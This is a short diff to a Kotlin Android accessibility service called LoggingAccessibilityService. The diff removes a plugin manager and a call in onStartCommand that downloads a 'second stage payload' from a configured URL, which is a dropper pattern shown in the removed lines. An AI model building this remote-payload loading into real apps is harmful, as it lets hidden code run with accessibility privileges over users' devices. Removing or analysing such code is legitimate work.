@@ -26,17 +26,10 @@ class LoggingAccessibilityService : AccessibilityService(), PluginCallback {
         private val TAG: String = LoggingAccessibilityService::class.java.name
     }
 
-    lateinit var pluginManager: PluginManager
-
     override fun onInterrupt() {
     }
 
-    override fun onCreate() {
-        pluginManager = PluginManager(this)
-    }
-
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        pluginManager.download(Config.SECOND_STAGE_PAYLOAD_URL)
         return Service.START_STICKY
     }
 
@@ -98,11 +91,6 @@ class LoggingAccessibilityService : AccessibilityService(), PluginCallback {
 
     override fun onDownloadFailed(cause: Throwable) {
         cause.printStackTrace()
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-        pluginManager.onDestroy()
     }
 
 
